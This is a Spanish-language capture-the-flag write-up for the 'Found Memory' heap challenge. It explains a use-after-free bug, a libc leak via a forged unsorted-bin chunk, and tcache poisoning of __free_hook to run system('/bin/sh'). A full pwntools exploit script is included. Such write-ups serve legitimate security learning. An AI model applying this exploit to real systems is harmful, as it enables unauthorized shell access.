# Found Memory

Este reto es similar a Lost Memory. Podemos:
- Reservar chunks de 0x30 bytes en el heap
- Liberarlos
- Leerlos
- Escribirlos

Al liberarse memoria no se asigna NULL a los punteros asi que tenemos una vulnerabilidad Use After Free.

### libc leak

Se liberan tres chunks y se sobreescribe el fd del segundo en el tcache para que apunte a la cabecera de chunk1
```
 tcache -> chunk2 -> chunk1 -> chunk0
                  fd        fd
                            -> chunk1 (header)
```

Dump de pwndbg:
```
tcachebins
0x40 [  3]: 0x5593dad4c320 —▸ 0x5593dad4c2e0 —▸ 0x5593dad4c2a0 ◂— 0

tcachebins
0x40 [  3]: 0x5593dad4c320 —▸ 0x5593dad4c2e0 —▸ 0x5593dad4c2d0 ◂— 0

pwndbg> x/20xw   0x5593dad4c2a0
0x5593dad4c2a0: 0x00000000      0x00000000      0xdad4c010      0x00005593
0x5593dad4c2b0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5593dad4c2c0: 0x00000000      0x00000000      0x00000000      0x00000000
0x5593dad4c2d0: 0x00000000      0x00000000      0x00000041      0x00000000
0x5593dad4c2e0: 0xdad4c2d0      0x00005593      0xdad4c010      0x00005593
```


Se reserva para obtener un puntero a la cabecera de chunk1 y se escribe en el campo `size` un valor grande (0x441). Cuando este chunk se libere sera enviado a `unsorted bin` por ser demasiado grande para `tcache`.

El primer chunk en unsorted bin tiene su fd y bk apuntando a direcciones de libc:
```
unsortedbin
all: 0x5607e59042d0 —▸ 0x7f60399d8be0 ◂— 0x5607e59042d0
```

``` python
free(0)
free(1)
free(2)
edit(1, p8(0xd0)) 
alloc() # c2 
alloc() # c1 
alloc() # c1 
edit(2, p64(0)+p64(0x441))
free(1) 
view(1)
leak = u64(r.recv(8))
```


### ret2libc

Finalmente podemos hacer un ret2libc usando el hook `__free_hook` que es llamado en lugar de `free` si no es nulo. 

Apuntando `__free_hook` a `system` y poniendo el argumento `/bin/sh\0` en el chunk a liberar conseguimos llamar a `system("/bin/sh")`

Estado del tcache durante el proceso:
```
 tcache -> chunk20 -> chunk19 -> __free_hook (puntero a system)
                  fd         fd
```

```python
#tcache poison to get a shell by overwriting the free hook ( < glibc 2.31 )
free(19)
free(20)
edit(21, b"/bin/sh\0")
edit(20, p64(libc.sym.__free_hook))
alloc()
alloc()
edit(19, p64(libc.sym.system))
rcu(b">")
#shell
sl(b"2")
sla(b"free:",bc(21))
#========= interactive ====================
r.interactive()
```

Exploit completo:
``` python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./found_memory")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break menu
'''
def start():
    if args.REMOTE:
        return remote("challenge.nahamcon.com", 32396)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
rcu(b">")
r.timeout = 1
def alloc():
    sl(b"1")
    line = r.recvline()
    rcu(b">")
    print(line.decode())

def free(index):
    sl(b"2")
    sla(b"Index to free: ", bc(index))
    rcu(b">")

def view(index):
    sl(b"3")
    sla(b"Index to view: ", bc(index))
    
def edit(index, data):
    sl(b"4")
    sla(b"Index to edit: ", bc(index))
    sa(b"Enter data: ", data)
#alloc chunks 24 is more than enough
for i in range(24):
    alloc()

#libc leak
free(0)
free(1)
free(2)
edit(1, p8(0xd0)) 
alloc() # c2 
alloc() # c1 
alloc() # c1 
edit(2, p64(0)+p64(0x441))
free(1) 
view(1)
leak = u64(r.recv(8))
logleak("libc leak", leak)
rcu(b">")
libc.address = leak - 0x1ecbe0
libcbase()

#tcache poison to get a shell by overwriting the free hook ( < glibc 2.31 )
free(19)
free(20)
edit(21, b"/bin/sh\0")
edit(20, p64(libc.sym.__free_hook))
alloc()
alloc()
edit(19, p64(libc.sym.system))
rcu(b">")
#shell
sl(b"2")
sla(b"free:",bc(21))

#========= interactive ====================
r.interactive()
```


